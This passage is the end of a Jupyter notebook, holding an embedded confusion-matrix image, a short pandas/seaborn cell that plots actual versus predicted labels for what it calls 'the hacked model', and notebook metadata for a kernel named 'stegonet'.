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gYtW7dWosWLZIkffzxx8rIyFBGRoa++eYbSdLKlSvd5zZu3Fhebwnwij179qhZs2batWuX5s2bp927d2v69OlatWqV4uPjdfz4cXfbAQMGuH/Wfz38/PxKfR2ojPgJR5m0a9dOu3fvVmpqqiZOnFjs+gcffKCPPvpIixcvVteuXd3n33jjDR07dkyPPPKI2rdvr/DwcPe1s2fPSpIiIiIUHR1t/psATDB48GAFBARo+fLlCgoKkiTVqlVLTZo00bXXXqvRo0dr2rRpkqTg4OBL/qwbXQcqIyokKBNfX1+lpKRoypQpOnToULHrc+fOVf369T3CyK+SkpJ07NgxrVixojyGCpSb48eP67PPPtOgQYPcYeRX0dHR6t27t95//31x2yfg4ggkKLO//OUvuummmzRmzJhi13bt2qWGDRuW+Lxfz+/atcvU8QHl7ccff5TL5brkz352draOHj0qSZo6daqqVq3qPpKSkjzaG10HKiOmbHBZJkyYoDvvvPOy/kf52wWwwB/Br5WRX3/2e/furdGjR7uvV69e3aO90XWgMiKQ4LK0bNlSHTt21N///nf169fPfb5+/fravn17ic/ZsWOHJCk2NrY8hgiUm3r16slms2n79u3q1q1bses7d+5UWFiYatSoIUmy2+2qV6/eRfszug5URkzZ4LKlpqZqyZIlWrdunftcz5499eOPP2rJkiXF2r/88suKiIhQ+/bty3OYgOl+/bmeOnWq8vLyPK5lZmbqvffeU48ePagOApdAIMFlu/HGG9W7d29NmTLFfa5nz576y1/+or59+2rWrFnat2+f/ve//2ngwIFavHix3nzzTYWEhFg4asAcaWlpcjqd6tixo9asWaODBw9q2bJlat++va6++mo9//zzVg8RqNAIJPhdnnvuOY+dAzabTR988IFGjx6tyZMnq0GDBrrjjju0f/9+ffHFFyWWs4HKIDY2Vps2bdK1116rHj166Nprr9Wjjz6qNm3aaP369R5b3QEUZ3OxDw0AAFiMCgkAALAcgQQAAFiOQAIAACxHIAEAAJYjkAAAAMsRSAAAgOUIJAAAwHIEEgAAYDkCCVAJjR07VjfddJP7cb9+/Sy5S+6+fftks9mUnp5e7q8N4MpCIAHKUb9+/WSz2WSz2eTv76+6detq+PDhOn36tKmv++qrr2r27NmlakuIAGAFP6sHAPzRdOrUSW+//bYKCgr01Vdf6ZFHHtHp06c1bdo0j3YFBQXy9/f3ymva7Xav9AMAZqFCApSzwMBARUdHKyYmRr169VLv3r21aNEi9zTLW2+9pbp16yowMFAul0s5OTl69NFHFRkZqdDQUN1555367rvvPPp84YUXFBUVpWrVqql///46e/asx/ULp2yKioo0YcIE1atXT4GBgapVq5b722jr1KkjSWrSpIlsNptat27tft7bb7+thg0bqkqVKmrQoIGmTp3q8TrffPONmjRpoipVqqhZs2basmWLFz85AJUZFRLAYkFBQSooKJAk7d69Wx988IEWLFggX19fSdLdd9+t8PBwLV26VHa7XTNmzFDbtm21a9cuhYeH64MPPtCYMWP0+uuv64477tCcOXP02muvqW7duhd9zeTkZM2cOVOTJ0/W7bffroyMDO3cuVPS+VBxyy23aOXKlbrhhhsUEBAgSZo5c6bGjBmjtLQ0NWnSRFu2bNGAAQMUEhKivn376vTp0+rSpYvuvPNOvfvuu9q7d6+GDRtm8qcHoNJwASg3ffv2dd1zzz3ux19//bUrIiLC1b17d9eYMWNc/v7+rqysLPf1VatWuUJDQ11nz5716Ofaa691zZgxw+VyuVzx8fGuxx57zON68+bNXY0bNy7xdU+ePOkKDAx0zZw5s8Qx7t271yXJtWXLFo/zMTExrrlz53qce+6551zx8fEul8vlmjFjhis8PNx1+vRp9/Vp06aV2BcAXIgpG6CcffLJJ6pataqqVKmi+Ph4tWzZUlOmTJEkXXPNNapZs6a77ebNm5Wbm6uIiAhVrVrVfezdu1c//fSTJGnHjh2Kj4/3eI0LH//Wjh075HQ61bZt21KP+ejRozp48KD69+/vMY7x48d7jKNx48YKDg4u1TgA4LeYsgHKWZs2bTRt2jT5+/vL4XB4LFwNCQnxaFtUVKSrrrpKX375ZbF+qlevflmvHxQUVObnFBUVSTo/bdO8eXOPa79OLblcrssaDwBIBBKg3IWEhKhevXqlavvnP/9ZmZmZ8vPzU+3atUts07BhQ23YsEEPPvig+9yGDRsu2mdsbKyCgoK0atUqPfLII8Wu/7pmpLCw0H0uKipKV199tfbs2aPevXuX2O/111+vOXPmKC8vzx16LjUOAPgtpmyACqxdu3aKj49Xt27d9Nlnn2nfvn1at26d/vGPf2jTpk2SpGHDhumtt97SW2+9pV27dmnMmDHatm3bRfusUqWKRo0apZEjR+pf//qXfvrpJ23YsEGzZs2SJEVGRiooKEjLli3TkSNHlJOTI+n8zdZSU1P16quvateuXfr+++/19ttva9KkSZKkXr16ycfHR/3799f27du1dOlSvfTSSyZ/QgAqCwIJUIHZbDYtXbpULVu21MMPP6z69eurZ8+e2rdvn6KioiRJPXr00LPPPqtRo0apadOm2r9/vx5//PFL9vvMM88oKSlJzz77rBo2bKgePXooKytLkuTn56fXXntNM2bMkMPh0D333CNJeuSRR/Tmm29q9uzZiouLU6tWrTR79mz3NuGqVatqyZIl2r59u5o0aaLRo0drwoQJJn46ACoTm4uJXwAAYDEqJAAAwHIEEgAAYDkCCQAAsByBBAAAWI5AAgAALEcgAQAAliOQAAAAyxFIAACA5QgkAADAcgQSAABgOQIJAACw3P8DH9K3SA9FrL8AAAAASUVORK5CYII=",
      "text/plain": [
       "<Figure size 640x480 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Plot the confusion matrix of the hacked model\n",
    "confusion_matrix = pd.crosstab(test_df['labels'], test_df['predicted'], rownames=['Actual'], colnames=['Predicted']) \n",
    "sn.heatmap(confusion_matrix, annot=True, cmap='Reds', fmt='g')\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.11.5 ('stegonet')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "ea657fec7a2d77f03ff159310cc18ad740da349ea886381f37ffaf17d07735ff"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
